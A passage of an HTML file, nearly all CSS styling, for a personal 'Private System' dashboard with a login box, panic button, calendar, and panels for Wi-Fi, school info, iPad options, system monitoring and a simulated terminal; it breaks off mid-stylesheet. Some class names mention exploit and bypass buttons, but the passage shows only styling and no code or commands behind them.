<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Private System</title>
  <!-- Font Awesome for Icons -->
  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/css/all.min.css">
  <!-- Chart.js for Data Visualization -->
  <script src="https://cdn.jsdelivr.net/npm/chart.js@4.4.0/dist/chart.umd.min.js"></script>
  <!-- HTML2Canvas for Screenshot -->
  <script src="https://cdn.jsdelivr.net/npm/html2canvas@1.4.1/dist/html2canvas.min.js"></script>
  
  <style>
    /* Global Styles & Animations */
    @keyframes flashRed {
      0%, 100% { border-color: red; box-shadow: 0 0 15px red; }
      50% { border-color: white; box-shadow: 0 0 5px white; }
    }
    
    @keyframes scrollLeft {
      0% { transform: translateX(0%); }
      100% { transform: translateX(-100%); }
    }

    @keyframes pulse {
      0% { transform: scale(1); opacity: 1; }
      50% { transform: scale(1.05); opacity: 0.8; }
      100% { transform: scale(1); opacity: 1; }
    }

    @keyframes glow {
      0% { box-shadow: 0 0 10px rgba(255, 145, 77, 0.5); }
      50% { box-shadow: 0 0 20px rgba(255, 145, 77, 0.8); }
      100% { box-shadow: 0 0 10px rgba(255, 145, 77, 0.5); }
    }

    @keyframes slideIn {
      from { transform: translateY(20px); opacity: 0; }
      to { transform: translateY(0); opacity: 1; }
    }
    
    @keyframes colorShift {
        0% { background-color: #ff914d; color: #000; }
        25% { background-color: #ffd966; color: #000; }
        50% { background-color: #ff914d; color: #000; }
        75% { background-color: #ffd966; color: #000; }
        100% { background-color: #ff914d; color: #000; }
    }

    * {
      box-sizing: border-box;
      font-family: 'Segoe UI', 'Montserrat', sans-serif;
      margin: 0; padding: 0;
    }
    
    body {
      transition: background-color 0.3s, color 0.3s;
    }

    /* Login System Styles */
    body.login-body {
      background: #000;
      color: #fff;
      display: flex;
      justify-content: center;
      align-items: center;
      height: 100vh;
      overflow: hidden; /* Prevent scrollbars during login */
    }
    
    .login-box {
      background: rgba(0, 0, 0, 0.85); /* Slightly transparent black */
      backdrop-filter: blur(5px); /* Glassmorphism effect */
      border-radius: 20px;
      border: 3px solid rgba(255, 255, 255, 0.8);
      box-shadow: 0 0 25px rgba(255, 255, 255, 0.5), 0 0 15px rgba(255, 145, 77, 0.4);
      width: 380px; /* Slightly wider */
      padding: 40px 35px; /* More padding */
      text-align: center;
      position: relative;
      transition: border-color 0.3s, box-shadow 0.3s, transform 0.3s ease-out;
      animation: glow 3s infinite alternate; /* Pulsing glow */
    }
    
    .login-box:hover {
        transform: translateY(-5px); /* Subtle lift on hover */
        border-color: white;
    }
    
    .login-box.flashing {
      animation: flashRed 0.4s ease-in-out 2;
    }
    
    .login-box h2 {
      font-size: 2em; /* Larger font */
      margin-bottom: 30px;
      font-family: 'Courier New', monospace;
      letter-spacing: 2px;
      text-shadow: 0 0 5px #ff914d; /* Text glow */
    }
    
    .login-box input[type="text"],
    .login-box input[type="password"] {
      width: 100%;
      padding: 15px; /* More padding */
      margin-bottom: 20px; /* More margin */
      background: rgba(28, 28, 28, 0.9); /* Darker, slightly transparent */
      border: 1px solid rgba(255, 255, 255, 0.3); /* Softer border */
      color: white;
      border-radius: 10px; /* More rounded corners */
      font-size: 1.1em; /* Larger font */
      transition: all 0.3s ease;
      box-shadow: inset 0 0 8px rgba(0,0,0,0.5);
    }
    
    .login-box input[type="text"]:focus,
    .login-box input[type="password"]:focus {
        outline: none;
        border-color: #ff914d;
        box-shadow: 0 0 15px rgba(255, 145, 77, 0.6), inset 0 0 8px rgba(255, 145, 77, 0.5);
        transform: scale(1.02); /* Slight scale up on focus */
    }
    
    .login-box label {
      display: flex;
      align-items: center;
      font-size: 0.95em;
      margin-bottom: 15px;
      gap: 10px;
      cursor: pointer;
      justify-content: center; /* Center label content */
    }
    
    #showPassword {
        accent-color: #ff914d; /* Color for the checkbox */
        transform: scale(1.2); /* Make checkbox slightly larger */
        cursor: pointer;
    }

    #showPassword:checked + span {
      color: #ff914d; /* Change text color when checked */
      font-weight: bold;
    }
    
    .login-box button {
      width: 100%;
      padding: 15px;
      background-color: #ff914d;
      color: #000; /* Black text for contrast */
      font-size: 1.1em;
      border: none;
      border-radius: 10px;
      cursor: pointer;
      font-weight: bold;
      transition: all 0.3s ease;
      text-transform: uppercase;
      letter-spacing: 1px;
      margin-top: 10px; /* Add some margin above the button */
    }
    
    .login-box button:hover {
        background-color: #ffb67a; /* Lighter orange */
        box-shadow: 0 0 12px rgba(255, 145, 77, 0.7);
        transform: translateY(-2px); /* Subtle lift */
    }
    
    .login-box button:active {
        transform: translateY(0); /* Press down effect */
    }
    
    .attempt-counter, .error-message {
      margin-top: 15px; /* Increased margin */
      font-size: 0.9em; /* Slightly larger */
      color: #ff6666; /* Brighter red */
      height: 20px; /* Ensure consistent height */
    }
    
    .popup {
      display: none;
      position: absolute;
      top: 50%;
      left: 50%;
      width: 340px; /* Wider popup */
      padding: 25px;
      transform: translate(-50%, -50%);
      background: rgba(0, 0, 0, 0.9); /* Darker background for popup */
      border: 3px solid #ff914d; /* Accent border */
      border-radius: 15px;
      box-shadow: 0 0 25px rgba(255, 145, 77, 0.7); /* Stronger shadow */
      z-index: 10;
      animation: glow 2s infinite alternate; /* Pulsing glow */
    }
    
    .popup p {
        margin-bottom: 20px;
        font-size: 1.1em;
        color: #ffd700; /* Gold color for warning */
    }

    .popup input {
      margin-bottom: 20px;
      padding: 12px;
      border: 1px solid #ff914d;
      background: rgba(10, 10, 10, 0.9);
    }
    
    .popup button {
        background-color: #ff914d;
        color: #000;
        border-radius: 8px;
        padding: 10px 15px;
        font-size: 1em;
        font-weight: bold;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s;
    }
    .popup button:hover {
        background-color: #ffb67a;
        transform: scale(1.03);
    }

    /* Dashboard Styles */
    body.dashboard-body {
      font-family: 'Montserrat', sans-serif;
      background-color: #1a1a1a;
      color: #f9f2dc;
      padding: 20px;
      transition: background-color 0.3s, color 0.3s;
      zoom: 1; /* Default zoom */
      overflow-x: hidden; /* Prevent horizontal scroll */
      position: relative; /* For background animations */
    }

    body.dashboard-body.light-theme {
      background-color: #f9f2dc;
      color: #1a1a1a;
    }
    
    /* Subtle background animation for dark theme */
    body.dashboard-body:not(.light-theme)::before {
        content: '';
        position: fixed;
        top: 0; left: 0; right: 0; bottom: 0;
        background: linear-gradient(45deg, #1a1a1a, #2a2a2a, #1a1a1a, #2a2a2a);
        background-size: 400% 400%;
        animation: colorShift 25s ease infinite;
        z-index: -1;
    }

    .dashboard-header {
      display: flex;
      justify-content: space-between;
      align-items: center;
      background: #ff914d;
      padding: 15px 30px; /* More padding */
      border-radius: 15px; /* More rounded */
      color: #000;
      margin-bottom: 25px; /* More margin */
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.4);
      animation: glow 4s infinite alternate;
      transition: background-color 0.3s;
    }

    .dashboard-header h1 {
      font-size: 28px; /* Larger heading */
      text-shadow: 0 0 8px rgba(0,0,0,0.2);
    }

    .user-info {
      font-weight: bold;
      font-size: 1.1em; /* Slightly larger font */
    }

    .version-box {
      background: #ffd966;
      padding: 10px 18px; /* More padding */
      border-radius: 10px; /* More rounded */
      color: #000;
      font-weight: bold;
      font-size: 0.95em;
      border: 2px solid #e0c000; /* Darker gold border */
      box-shadow: inset 0 0 5px rgba(0,0,0,0.2);
    }

    .quick-bar {
      display: flex;
      justify-content: center;
      gap: 15px; /* More gap */
      margin-bottom: 15px; /* More margin */
      flex-wrap: wrap;
      padding: 10px 0;
      background: rgba(42, 42, 42, 0.7); /* Semi-transparent background */
      backdrop-filter: blur(5px);
      border-radius: 12px;
      box-shadow: inset 0 0 10px rgba(0,0,0,0.5);
    }

    .quick-bar button {
      background-color: #ff914d;
      border: none;
      padding: 12px 18px; /* More padding */
      border-radius: 10px; /* More rounded */
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
      min-width: 120px; /* Wider buttons */
      white-space: nowrap;
      font-size: 0.95em;
      letter-spacing: 0.5px;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }

    .quick-bar button:hover {
      background-color: #ffb67a;
      transform: translateY(-3px); /* Lift effect */
      box-shadow: 0 6px 15px rgba(255, 145, 77, 0.5);
    }
    
    .quick-bar button:active {
        transform: translateY(0);
        box-shadow: 0 2px 4px rgba(0,0,0,0.2);
    }

    #panicBtn {
      background: #ff4c4c !important;
      color: white !important;
      border: 2px solid #cc3333;
      box-shadow: 0 0 10px rgba(255, 0, 0, 0.7);
    }
    
    #panicBtn:hover {
        background: #ff7f7f !important;
        box-shadow: 0 0 15px rgba(255, 0, 0, 0.9);
    }

    .announcement-bar {
      width: 100%;
      background-color: #ff914d;
      color: black;
      font-weight: bold;
      padding: 10px 0;
      overflow: hidden;
      position: relative;
      border-radius: 10px;
      box-sizing: border-box;
      margin-bottom: 25px; /* More margin */
      user-select: none;
      height: 40px; /* Taller bar */
      line-height: 20px; /* Center text vertically */
      font-size: 1.1em;
      text-align: center;
      animation: colorShift 30s linear infinite;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.4);
    }

    .announcement-bar span {
      display: inline-block;
      white-space: nowrap;
      position: absolute;
      will-change: transform;
      animation: scrollLeft 20s linear infinite;
      padding-left: 100%;
    }

    body.dashboard-body.light-theme .announcement-bar {
      background-color: #ffd966;
      color: #000;
    }

    .main-row {
      display: flex;
      gap: 25px; /* More gap */
      margin-bottom: 25px; /* More margin */
      flex-wrap: wrap;
      justify-content: center; /* Center items if they wrap */
    }

    .box {
      background-color: #2a2a2a;
      padding: 25px; /* More padding */
      border-radius: 15px; /* More rounded */
      box-shadow: 0 0 18px rgba(255, 145, 77, 0.3), 0 0 5px rgba(255, 145, 77, 0.3); /* Layered shadow */
      min-height: 150px; /* Taller boxes */
      transition: background-color 0.3s, color 0.3s, box-shadow 0.3s, transform 0.3s ease;
      flex: 1 1 300px; /* Responsive flex basis */
      overflow: hidden; /* Prevent content overflow */
    }

    .box:hover {
        transform: translateY(-5px);
        box-shadow: 0 0 25px rgba(255, 145, 77, 0.5), 0 0 10px rgba(255, 145, 77, 0.5);
    }

    body.dashboard-body.light-theme .box {
      background-color: #fff8e1; /* Lighter beige */
      color: #333;
      box-shadow: 0 0 18px rgba(255, 145, 77, 0.6), 0 0 5px rgba(255, 145, 77, 0.6);
    }
    
    body.dashboard-body.light-theme .box:hover {
        box-shadow: 0 0 30px rgba(255, 145, 77, 0.8), 0 0 12px rgba(255, 145, 77, 0.8);
    }

    .box h2 {
      font-size: 20px; /* Larger heading */
      margin-bottom: 12px;
      color: #ffbf80;
      border-bottom: 1px solid #ff914d; /* Underline */
      padding-bottom: 8px;
      display: inline-block; /* Allows border-bottom to fit content */
      text-shadow: 0 0 5px rgba(255,145,77,0.5);
    }

    body.dashboard-body.light-theme .box h2 {
      color: #994d00;
      border-bottom: 1px solid #b37700;
    }

    .box p, .box ul {
      font-size: 15px; /* Slightly larger text */
      line-height: 1.6;
    }
    
    .box ul {
        padding-left: 25px; /* Indent list items */
    }
    
    .box li {
        margin-bottom: 8px; /* Spacing between list items */
    }

    .update-entry {
      background: #40210f;
      padding: 10px 12px; /* More padding */
      margin-top: 8px; /* More margin */
      border-radius: 8px; /* More rounded */
      color: #ffccb3;
      font-size: 14px;
      border-left: 3px solid #ff914d; /* Accent border */
      transition: background-color 0.2s ease;
    }
    
    .update-entry:hover {
        background-color: #522a17; /* Darker on hover */
    }

    body.dashboard-body.light-theme .update-entry {
      background: #fff2e0; /* Lighter update background */
      color: #994d00;
      border-left: 3px solid #b37700;
    }
    
    body.dashboard-body.light-theme .update-entry:hover {
        background-color: #ffe8cc;
    }

    .calendar {
      display: grid;
      grid-template-columns: repeat(7, 1fr);
      gap: 6px; /* Slightly more gap */
      margin-top: 12px;
      text-align: center;
      font-size: 13px; /* Slightly larger font */
    }

    .calendar div:first-child { /* Style for day names */
      font-weight: bold;
      color: #ff914d;
      border-bottom: 2px solid #ff914d;
      padding-bottom: 5px;
      margin-bottom: 5px;
      background: none; /* Remove background for day names */
    }

    body.dashboard-body.light-theme .calendar div:first-child {
      color: #b37700;
      border-bottom: 2px solid #b37700;
    }
    
    .calendar div {
      padding: 8px; /* More padding */
      background: #333;
      border-radius: 6px; /* More rounded */
      transition: background-color 0.2s, transform 0.2s;
      cursor: default; /* Default cursor for days */
    }
    
    .calendar div:not(.today):hover {
        background: #444;
        transform: scale(1.05);
    }

    .today {
      background: #ff914d !important;
      font-weight: bold;
      color: black;
      transform: scale(1.1); /* Make today stand out */
      box-shadow: 0 0 10px rgba(255, 145, 77, 0.8);
    }

    body.dashboard-body.light-theme .calendar div {
      background: #fff8e1; /* Lighter background */
      color: #333;
    }
    
    body.dashboard-body.light-theme .calendar div:not(.today):hover {
        background: #fff2e0;
    }

    body.dashboard-body.light-theme .today {
      background: #b37700 !important; /* Darker orange for today */
      color: #fff8e1; /* Light text on dark background */
      box-shadow: 0 0 10px rgba(179, 119, 0, 0.8);
    }

    #canvasContainer {
      display: none;
      margin-top: 25px;
      text-align: center;
      animation: slideIn 0.4s ease-out;
    }

    #notesCanvas {
      border: 3px solid #ff914d; /* Thicker border */
      border-radius: 15px; /* More rounded */
      background: #1a1a1a; /* Dark background for canvas */
      cursor: crosshair;
      touch-action: none;
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.5);
    }
    
    body.dashboard-body.light-theme #notesCanvas {
        background: #fff;
        border-color: #b37700;
        box-shadow: 0 0 20px rgba(255, 145, 77, 0.8);
    }

    #canvasControls {
      margin-top: 15px;
    }

    #canvasControls button {
      background-color: #ff914d;
      border: none;
      padding: 10px 20px; /* More padding */
      border-radius: 8px;
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s, transform 0.2s;
      margin: 0 8px; /* More margin between buttons */
      font-size: 0.95em;
    }
    
    #canvasControls button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }

    .motivation-box {
      background-color: #333;
      color: #ffd966;
      padding: 25px; /* More padding */
      border-radius: 15px; /* More rounded */
      font-style: italic;
      font-size: 17px; /* Larger font */
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.5);
      display: flex;
      align-items: center;
      justify-content: center;
      min-height: 150px; /* Taller */
      text-align: center;
      font-family: 'Georgia', serif; /* Different font for quotes */
      animation: glow 5s infinite alternate;
    }

    body.dashboard-body.light-theme .motivation-box {
      background-color: #fff3cc;
      color: #994d00;
      box-shadow: 0 0 15px rgba(255, 145, 77, 0.8);
    }

    /* General Info Panel Styles */
    .info-panel {
      display: none; /* Hidden by default */
      background-color: rgba(42, 42, 42, 0.85); /* Semi-transparent dark */
      backdrop-filter: blur(8px);
      padding: 25px; /* More padding */
      border-radius: 15px; /* More rounded */
      margin-top: 20px;
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.3), inset 0 0 10px rgba(0,0,0,0.5);
      animation: slideIn 0.4s ease-out;
      border: 1px solid rgba(255,145,77,0.3);
    }

    body.dashboard-body.light-theme .info-panel {
      background-color: rgba(255, 248, 225, 0.9); /* Semi-transparent light beige */
      color: #333;
      box-shadow: 0 0 20px rgba(255, 145, 77, 0.6), inset 0 0 10px rgba(255,255,255,0.3);
      border: 1px solid rgba(179,119,0,0.3);
    }

    .info-panel h2 {
      color: #ff914d;
      margin-bottom: 20px; /* More margin */
      border-bottom: 2px solid #ff914d;
      padding-bottom: 10px;
      font-size: 22px; /* Larger heading */
      text-shadow: 0 0 5px rgba(255,145,77,0.5);
    }

    body.dashboard-body.light-theme .info-panel h2 {
      color: #b37700;
      border-bottom: 2px solid #b37700;
    }
    
    /* Specific Panel Styles */
    .wifi-grid, .wifi-entry {
      display: grid;
      grid-template-columns: repeat(8, 1fr);
      gap: 12px; /* More gap */
      margin-bottom: 15px;
    }

    .wifi-grid div {
      padding: 10px; /* More padding */
      background: #333;
      border-radius: 8px; /* More rounded */
      text-align: center;
      font-weight: bold;
      font-size: 0.9em;
      border: 1px solid rgba(255, 145, 77, 0.2);
    }

    body.dashboard-body.light-theme .wifi-grid div {
      background: #fff8e1;
      border: 1px solid rgba(179,119,0,0.2);
    }

    .wifi-entry div {
      padding: 10px; /* More padding */
      background: #40210f;
      border-radius: 8px; /* More rounded */
      text-align: center;
      font-size: 0.9em;
    }

    body.dashboard-body.light-theme .wifi-entry div {
      background: #fff2e0;
    }

    .handbook-buttons, .links-list {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); /* Responsive columns */
      gap: 12px; /* More gap */
      margin-top: 18px;
    }

    .handbook-buttons button, .links-list a, .exploit-buttons a {
      display: block;
      background-color: #ff914d;
      border: none;
      padding: 14px 18px; /* More padding */
      border-radius: 10px; /* More rounded */
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s ease, transform 0.2s ease, box-shadow 0.2s ease;
      text-decoration: none;
      text-align: center;
      font-size: 1em;
      box-shadow: 0 4px 6px rgba(0,0,0,0.1);
    }
    
    .handbook-buttons button:hover, .links-list a:hover, .exploit-buttons a:hover {
      background-color: #ffb67a;
      transform: translateY(-3px);
      box-shadow: 0 6px 15px rgba(255, 145, 77, 0.5);
    }
    
    body.dashboard-body.light-theme .handbook-buttons button,
    body.dashboard-body.light-theme .links-list a,
    body.dashboard-body.light-theme .exploit-buttons a {
      background-color: #ffd966;
      color: #000;
      border: 1px solid #e0c000;
    }
    
    body.dashboard-body.light-theme .handbook-buttons button:hover,
    body.dashboard-body.light-theme .links-list a:hover,
    body.dashboard-body.light-theme .exploit-buttons a:hover {
      background-color: #ffe099;
      box-shadow: 0 6px 15px rgba(255, 204, 102, 0.5);
    }

    .exploit-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); /* Responsive columns */
      gap: 12px; /* More gap */
      margin-top: 18px;
    }

    .bypass-buttons {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); /* Responsive columns */
      gap: 12px; /* More gap */
      margin-top: 18px;
    }

    .bypass-buttons button {
      background-color: #ff914d;
      border: none;
      padding: 14px 18px; /* More padding */
      border-radius: 10px; /* More rounded */
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s ease, transform 0.2s ease;
      font-size: 1em;
    }
    
    .bypass-buttons button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }
    
    body.dashboard-body.light-theme .bypass-buttons button {
      background-color: #ffd966;
      color: #000;
      border: 1px solid #e0c000;
    }
    
    body.dashboard-body.light-theme .bypass-buttons button:hover {
        background-color: #ffe099;
    }

    .coming-soon {
      background: #40210f;
      padding: 15px 20px; /* More padding */
      border-radius: 10px; /* More rounded */
      margin-top: 18px;
      text-align: center;
      font-weight: bold;
      font-size: 1.1em;
      border: 1px dashed #ff914d;
      box-shadow: inset 0 0 10px rgba(0,0,0,0.4);
    }
    
    body.dashboard-body.light-theme .coming-soon {
      background: #fff2e0;
      border: 1px dashed #b37700;
    }

    .info-text {
      background: #40210f;
      padding: 15px 20px; /* More padding */
      border-radius: 10px; /* More rounded */
      margin-top: 18px;
      font-size: 1em;
      line-height: 1.6;
      border-left: 4px solid #ff914d;
    }

    body.dashboard-body.light-theme .info-text {
      background: #fff2e0;
      border-left: 4px solid #b37700;
    }

    .school-info-grid {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr)); /* Responsive columns */
      gap: 15px; /* More gap */
      margin-top: 18px;
    }

    .school-info-item {
      background: #40210f;
      padding: 15px; /* More padding */
      border-radius: 10px; /* More rounded */
      border: 1px solid rgba(255, 145, 77, 0.3);
      transition: background-color 0.2s ease, transform 0.2s ease;
    }
    
    .school-info-item:hover {
        background-color: #522a17;
        transform: translateY(-3px);
    }

    body.dashboard-body.light-theme .school-info-item {
      background: #fff2e0;
      border: 1px solid rgba(179, 119, 0, 0.3);
    }
    
    body.dashboard-body.light-theme .school-info-item:hover {
        background-color: #ffe8cc;
    }

    .school-info-label {
      font-weight: bold;
      color: #ff914d;
      margin-bottom: 6px; /* More margin */
      font-size: 1.05em;
      display: block; /* Ensure it takes full width */
    }

    body.dashboard-body.light-theme .school-info-label {
      color: #994d00;
    }
    
    .school-info-item div:not(.school-info-label) {
        font-size: 0.95em;
    }

    .ipad-options {
      display: flex;
      gap: 10px;
      margin-top: 18px;
      justify-content: center; /* Center buttons */
    }

    .ipad-options button {
      flex: 1; /* Equal width */
      background-color: #ff914d;
      border: none;
      padding: 12px 18px; /* More padding */
      border-radius: 10px; /* More rounded */
      color: black;
      font-weight: bold;
      cursor: pointer;
      transition: background-color 0.2s ease, transform 0.2s ease;
      font-size: 1em;
    }
    
    .ipad-options button:hover {
        background-color: #ffb67a;
        transform: translateY(-2px);
    }
    
    body.dashboard-body.light-theme .ipad-options button {
      background-color: #ffd966;
      color: #000;
      border: 1px solid #e0c000;
    }
    
    body.dashboard-body.light-theme .ipad-options button:hover {
        background-color: #ffe099;
    }

    .ipad-content, .bypass-content {
      background: #40210f;
      padding: 20px; /* More padding */
      border-radius: 12px; /* More rounded */
      margin-top: 18px;
      display: none; /* Hidden by default */
      animation: slideIn 0.4s ease-out;
    }
    
    body.dashboard-body.light-theme .ipad-content,
    body.dashboard-body.light-theme .bypass-content {
      background: #fff2e0;
    }
    
    /* --- NEW FEATURES STYLES --- */

    /* System Monitoring */
    .monitoring-grid {
        display: grid;
        grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
        gap: 20px;
        margin-bottom: 20px;
    }
    .monitor-item {
        background: rgba(50, 50, 50, 0.6);
        padding: 20px;
        border-radius: 12px;
        border: 1px solid rgba(255, 145, 77, 0.2);
        transition: transform 0.2s, box-shadow 0.2s;
    }
    .monitor-item:hover {
        transform: translateY(-4px);
        box-shadow: 0 0 15px rgba(255, 145, 77, 0.4);
    }
    body.dashboard-body.light-theme .monitor-item {
        background: rgba(255, 240, 200, 0.6);
        border: 1px solid rgba(179, 119, 0, 0.2);
    }
    body.dashboard-body.light-theme .monitor-item:hover {
        box-shadow: 0 0 15px rgba(179, 119, 0, 0.4);
    }
    .monitor-label {
        font-weight: bold;
        color: #ff914d;
        margin-bottom: 8px;
        font-size: 1.05em;
        display: block;
    }
    body.dashboard-body.light-theme .monitor-label {
        color: #b37700;
    }
    .monitor-value {
        font-size: 1.2em;
        margin-bottom: 12px;
        display: block;
    }
    .monitor-bar-container {
        width: 100%;
        height: 10px;
        background: rgba(255, 255, 255, 0.1);
        border-radius: 5px;
        overflow: hidden;
        margin-top: 5px;
    }
    .monitor-bar {
        height: 100%;
        background-color: #ff914d; /* Default color */
        transition: width 0.5s ease-out;
    }
    .monitor-bar.cpu-bar { background-color: #4CAF50; } /* Green */
    .monitor-bar.ram-bar { background-color: #2196F3; } /* Blue */
    .monitor-bar.disk-bar { background-color: #FFC107; } /* Amber */
    .monitor-bar.network-bar { background-color: #FF5722; } /* Deep Orange */
    
    body.dashboard-body.light-theme .monitor-bar.cpu-bar { background-color: #4CAF50; }
    body.dashboard-body.light-theme .monitor-bar.ram-bar { background-color: #2196F3; }
    body.dashboard-body.light-theme .monitor-bar.disk-bar { background-color: #FFC107; }
    body.dashboard-body.light-theme .monitor-bar.network-bar { background-color: #FF5722; }

    .monitoring-details h3 {
        margin-top: 25px;
        margin-bottom: 10px;
        color: #ff914d;
        border-bottom: 1px solid #ff914d;
        padding-bottom: 5px;
    }
    body.dashboard-body.light-theme .monitoring-details h3 {
        color: #b37700;
        border-bottom: 1px solid #b37700;
    }
    .monitoring-details p { font-size: 0.95em; margin-bottom: 5px; }

    /* Task Manager */
    .task-manager-controls {
        display: flex;
        gap: 10px;
        margin-bottom: 15px;
        flex-wrap: wrap;
    }
    .task-manager-controls input[type="text"] {
        flex-grow: 1;
        padding: 8px 12px;
        border-radius: 6px;
        border: 1px solid #ff914d;
        background: rgba(10, 10, 10, 0.7);
        color: white;
    }
    body.dashboard-body.light-theme .task-manager-controls input[type="text"] {
        border: 1px solid #b37700;
        background: rgba(255, 255, 255, 0.7);
        color: #333;
    }
    .task-manager-controls button {
        padding: 8px 15px;
        border-radius: 6px;
        background: #ff914d;
        color: black;
        border: none;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s;
    }
    .task-manager-controls button:hover { background: #ffb67a; transform: scale(1.03); }
    body.dashboard-body.light-theme .task-manager-controls button { background: #ffd966; }
    body.dashboard-body.light-theme .task-manager-controls button:hover { background: #ffe099; }
    
    #processTable {
        width: 100%;
        border-collapse: separate; /* For rounded corners on cells */
        border-spacing: 0 8px; /* Spacing between rows */
    }
    #processTable th, #processTable td {
        padding: 12px 15px;
        text-align: left;
        border: 1px solid rgba(255, 145, 77, 0.2);
    }
    body.dashboard-body.light-theme #processTable th,
    body.dashboard-body.light-theme #processTable td {
        border: 1px solid rgba(179, 119, 0, 0.2);
    }
    #processTable thead th {
        background: #ff914d;
        color: black;
        font-weight: bold;
        border-radius: 8px 8px 0 0; /* Top rounded corners */
        text-shadow: 0 0 3px rgba(0,0,0,0.2);
    }
    body.dashboard-body.light-theme #processTable thead th {
        background: #ffd966;
        color: #000;
    }
    #processTable tbody tr {
        background: rgba(42, 42, 42, 0.7);
        border-radius: 8px; /* Apply border radius to rows too */
        transition: background-color 0.2s, transform 0.2s;
    }
    #processTable tbody tr:hover {
        background: rgba(60, 60, 60, 0.8);
        transform: scale(1.005);
    }
    body.dashboard-body.light-theme #processTable tbody tr {
        background: rgba(255, 240, 200, 0.7);
    }
    body.dashboard-body.light-theme #processTable tbody tr:hover {
        background: rgba(255, 235, 180, 0.8);
    }
    #processTable td { font-size: 0.95em; }
    #processTable td:nth-child(3), /* CPU % */
    #processTable td:nth-child(4), /* Memory */
    #processTable td:nth-child(5) { /* Status */
        text-align: right;
    }
    #processTable tr:last-child td {
        border-radius: 0 0 8px 8px; /* Bottom rounded corners */
    }

    /* File Explorer */
    .file-explorer-controls {
        display: flex;
        gap: 10px;
        margin-bottom: 15px;
        flex-wrap: wrap;
    }
    .file-explorer-controls button {
        padding: 8px 15px;
        border-radius: 6px;
        background: #ff914d;
        color: black;
        border: none;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s;
    }
    .file-explorer-controls button:hover { background: #ffb67a; transform: scale(1.03); }
    body.dashboard-body.light-theme .file-explorer-controls button { background: #ffd966; }
    body.dashboard-body.light-theme .file-explorer-controls button:hover { background: #ffe099; }
    
    #fileSystemView {
        max-height: 300px; /* Limit height */
        overflow-y: auto; /* Add scroll if needed */
        background: rgba(10, 10, 10, 0.7);
        padding: 15px;
        border-radius: 8px;
        border: 1px solid rgba(255, 145, 77, 0.2);
    }
    body.dashboard-body.light-theme #fileSystemView {
        background: rgba(255, 255, 255, 0.7);
        border: 1px solid rgba(179, 119, 0, 0.2);
    }
    #fileSystemList {
        list-style: none;
        padding: 0;
    }
    #fileSystemList li {
        margin-bottom: 8px;
        padding: 8px 12px;
        background: rgba(30, 30, 30, 0.7);
        border-radius: 6px;
        cursor: pointer;
        transition: background 0.2s, transform 0.2s;
        display: flex;
        align-items: center;
        gap: 10px;
        border-left: 3px solid #ff914d;
    }
    #fileSystemList li:hover {
        background: rgba(50, 50, 50, 0.8);
        transform: scale(1.01);
    }
    body.dashboard-body.light-theme #fileSystemList li {
        background: rgba(255, 240, 200, 0.7);
        border-left: 3px solid #b37700;
    }
    body.dashboard-body.light-theme #fileSystemList li:hover {
        background: rgba(255, 235, 180, 0.8);
    }
    .file-icon { margin-right: 8px; color: #ff914d; }
    body.dashboard-body.light-theme .file-icon { color: #b37700; }
    .folder-icon { color: #ffd966; }
    body.dashboard-body.light-theme .folder-icon { color: #cc9900; }

    /* CLI Simulator */
    .cli-output-area {
        height: 250px;
        background: #0a0a0a;
        border-radius: 8px;
        padding: 15px;
        overflow-y: auto;
        margin-bottom: 15px;
        font-family: 'Consolas', 'Courier New', monospace;
        font-size: 0.95em;
        border: 1px solid rgba(255, 145, 77, 0.2);
        box-shadow: inset 0 0 8px rgba(0,0,0,0.5);
        color: #00ff00; /* Green terminal text */
    }
    body.dashboard-body.light-theme .cli-output-area {
        background: #1a1a1a;
        border: 1px solid rgba(179, 119, 0, 0.2);
        color: #00cc00;
    }
    .cli-output-area p { margin-bottom: 5px; }
    .cli-output-area p:last-child { margin-bottom: 0; }
    .cli-input-area {
        display: flex;
        align-items: center;
        gap: 10px;
    }
    #cliPrompt {
        color: #00ff00;
        font-weight: bold;
        font-family: 'Consolas', 'Courier New', monospace;
    }
    body.dashboard-body.light-theme #cliPrompt {
        color: #00cc00;
    }
    #cliInput {
        flex-grow: 1;
        background: transparent;
        border: none;
        outline: none;
        color: #00ff00;
        font-family: 'Consolas', 'Courier New', monospace;
        font-size: 1em;
        caret-color: #00ff00; /* Cursor color */
    }
    body.dashboard-body.light-theme #cliInput {
        color: #00cc00;
        caret-color: #00cc00;
    }

    /* Reminder System */
    .reminder-input-area {
        display: flex;
        gap: 10px;
        margin-bottom: 20px;
        flex-wrap: wrap;
        align-items: center;
    }
    .reminder-input-area input[type="text"],
    .reminder-input-area input[type="datetime-local"] {
        padding: 10px 12px;
        border-radius: 6px;
        border: 1px solid #ff914d;
        background: rgba(10, 10, 10, 0.7);
        color: white;
        flex-grow: 1; /* Allow inputs to grow */
    }
    body.dashboard-body.light-theme .reminder-input-area input[type="text"],
    body.dashboard-body.light-theme .reminder-input-area input[type="datetime-local"] {
        border: 1px solid #b37700;
        background: rgba(255, 255, 255, 0.7);
        color: #333;
    }
    .reminder-input-area input[type="datetime-local"] {
        flex-grow: 0; /* Don't grow as much */
    }
    .reminder-input-area button {
        padding: 10px 18px;
        border-radius: 6px;
        background: #ff914d;
